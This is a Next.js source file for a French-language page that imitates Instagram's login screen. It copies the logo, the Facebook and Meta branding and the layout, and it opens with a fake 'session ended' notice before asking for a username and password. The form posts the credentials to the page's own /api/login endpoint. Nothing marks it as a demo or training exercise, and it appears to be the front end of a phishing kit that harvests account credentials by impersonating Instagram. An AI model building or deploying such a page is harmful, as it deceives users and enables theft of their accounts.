"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [showExpired, setShowExpired] = useState(true);
  const router = useRouter();

  useEffect(() => {
    const timer = setTimeout(() => setShowExpired(false), 3000);
    return () => clearTimeout(timer);
  }, []);

  const handleLogin = async () => {
    if (!username || !password) return;
    setLoading(true);
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (data.success) {
        router.push(`/logged-in?user=${encodeURIComponent(username)}`);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  if (showExpired) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white">
        <div className="flex flex-col items-center gap-4 px-6 text-center">
          <div className="flex h-16 w-16 items-center justify-center rounded-full bg-red-100">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="32"
              height="32"
              viewBox="0 0 24 24"
              fill="none"
              stroke="#ef4444"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <circle cx="12" cy="12" r="10" />
              <line x1="12" y1="8" x2="12" y2="12" />
              <line x1="12" y1="16" x2="12.01" y2="16" />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-900">Votre session est terminée</h1>
          <p className="text-sm text-gray-500">Veuillez vous reconnecter</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-white">
      <div className="flex w-full max-w-[400px] flex-col items-center px-6 py-10">
        {/* Instagram Logo */}
        <div className="mb-10">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 64 64"
            width="56"
            height="56"
          >
            <defs>
              <linearGradient
                id="igGradient"
                x1="0%"
                y1="100%"
                x2="100%"
                y2="0%"
              >
                <stop offset="0%" stopColor="#feda75" />
                <stop offset="20%" stopColor="#fa7e1e" />
                <stop offset="45%" stopColor="#d62976" />
                <stop offset="70%" stopColor="#962fbf" />
                <stop offset="100%" stopColor="#4f5bd5" />
              </linearGradient>
            </defs>
            <rect
              x="2"
              y="2"
              width="60"
              height="60"
              rx="16"
              ry="16"
              fill="none"
              stroke="url(#igGradient)"
              strokeWidth="4"
            />
            <circle
              cx="32"
              cy="32"
              r="13"
              fill="none"
              stroke="url(#igGradient)"
              strokeWidth="4"
            />
            <circle cx="48" cy="16" r="3.5" fill="url(#igGradient)" />
          </svg>
        </div>

        {/* Header */}
        <div className="mb-8 flex w-full items-center">
          <button className="mr-3 text-xl text-gray-800">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <path d="M15 18l-6-6 6-6" />
            </svg>
          </button>
          <h1 className="text-base font-semibold text-gray-900">
            Se connecter à Instagram
          </h1>
        </div>

        {/* Form */}
        <div className="flex w-full flex-col gap-3">
          <input
            type="text"
            placeholder="Numéro de mobile, nom de profil ou ..."
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3.5 text-sm text-gray-900 placeholder-gray-400 outline-none focus:border-gray-300"
          />
          <input
            type="password"
            placeholder="Mot de passe"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3.5 text-sm text-gray-900 placeholder-gray-400 outline-none focus:border-gray-300"
          />
        </div>

        {/* Login Button */}
        <button
          onClick={handleLogin}
          disabled={loading}
          className="mt-5 w-full rounded-full bg-[#0095f6] py-3 text-sm font-semibold text-white hover:bg-[#1877f2] transition-colors disabled:opacity-50"
        >
          {loading ? "Connexion..." : "Se connecter"}
        </button>

        {/* Forgot Password */}
        <button className="mt-4 text-sm font-medium text-[#00376b]">
          Mot de passe oublié ?
        </button>

        {/* Divider spacer */}
        <div className="my-5" />

        {/* Facebook Login */}
        <button className="flex w-full items-center justify-center gap-2 rounded-full border border-gray-200 py-3 text-sm font-semibold text-gray-900 hover:bg-gray-50 transition-colors">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="20"
            height="20"
            viewBox="0 0 24 24"
            fill="#1877f2"
          >
            <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073c0 6.025 4.388 11.018 10.125 11.927v-8.437H7.078v-3.49h3.047V9.41c0-3.026 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.971H15.83c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796v8.437C19.612 23.09 24 18.098 24 12.073z" />
          </svg>
          Se connecter avec Facebook
        </button>

        {/* Create Account */}
        <button className="mt-4 w-full rounded-full border border-[#0095f6] py-3 text-sm font-semibold text-[#0095f6] hover:bg-blue-50 transition-colors">
          Créer un nouveau compte
        </button>

        {/* Meta Logo */}
        <div className="mt-8 flex items-center gap-1 text-gray-400">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="60"
            height="12"
            viewBox="0 0 100 20"
            fill="#a8a8a8"
          >
            <text
              x="0"
              y="16"
              fontFamily="Arial, sans-serif"
              fontSize="16"
              fontWeight="400"
            >
              Meta
            </text>
          </svg>
        </div>
      </div>
    </div>
  );
}
